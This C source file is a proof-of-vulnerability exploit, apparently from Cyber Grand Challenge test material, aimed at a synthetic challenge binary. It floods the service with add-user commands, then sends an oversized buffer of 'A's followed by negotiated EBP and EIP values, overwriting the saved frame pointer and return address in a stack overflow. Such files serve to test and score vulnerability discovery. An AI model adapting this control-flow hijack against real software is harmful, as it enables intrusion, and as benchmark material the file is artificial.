/*
 * Copyright (c) 2014 Kaprica Security, Inc.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 */

#include <libpov.h>
#include <libcgc.h>

int main()
{
    char *payload;

    int pov_type = 1;
    int eip_mask = 0xfefefefe;
    int ebp_mask = 0xfefefefe;
    int ebp_num = 5; // ebp
    int target_eip = 0, target_ebp = 0;

    // negotiate type 1
    transmit_all(3, &pov_type, sizeof(pov_type));
    transmit_all(3, &eip_mask, sizeof(eip_mask));
    transmit_all(3, &ebp_mask, sizeof(ebp_mask));
    transmit_all(3, &ebp_num, sizeof(ebp_num));

    if (length_read(3, (unsigned char *)&target_eip, sizeof(target_eip)) != sizeof(target_eip))
        return -1;
    if (length_read(3, (unsigned char *)&target_ebp, sizeof(target_ebp)) != sizeof(target_ebp))
        return -1;

    transmit_all(STDOUT, "3829", 4); //dummy

    //char *add_user[128];
    char add_user[128];
    strcpy(add_user, "2\nUser000\nBlahblahblah\n");
    int i = 0, offset = 8;
    for (i = 1; i < 105; i++) {
        if (i % 100 == 0) {
            add_user[offset] = '0';
            add_user[offset - 1] = '0';
            add_user[offset - 2] = add_user[offset - 2] + 1;
        } else if (i % 10 == 0) {
            add_user[offset] = '0';
            add_user[offset - 1] = add_user[offset - 1] + 1;
        } else {
            add_user[offset] = add_user[offset] + 1;
        }
        transmit_all(STDOUT, add_user, strlen(add_user));
    }
    payload = "2\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

    transmit_all(STDOUT, payload, strlen(payload));

    // ebp overwrite
    target_ebp |= 0x01010101;
    transmit_all(STDOUT, &target_ebp, sizeof(target_ebp));

    // eip overwrite
    target_eip |= 0x01010101;
    transmit_all(STDOUT, &target_eip, sizeof(target_eip));

    transmit_all(STDOUT, "\n", 1);
    return 0;

}
